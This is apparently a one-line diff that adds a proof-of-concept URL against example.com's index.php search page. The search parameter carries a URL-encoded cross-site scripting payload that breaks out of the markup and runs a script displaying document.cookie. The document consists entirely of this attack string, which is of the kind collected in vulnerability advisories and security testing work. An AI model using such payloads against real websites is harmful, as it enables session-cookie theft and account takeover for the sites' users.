@@ -1,0 +1,1 @@
+http://www.example.com/index.php?page=search&amp;search=%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&amp;author_id=&amp;author=&amp;startdate=&amp;enddate=&amp;pf=1&amp;topic=
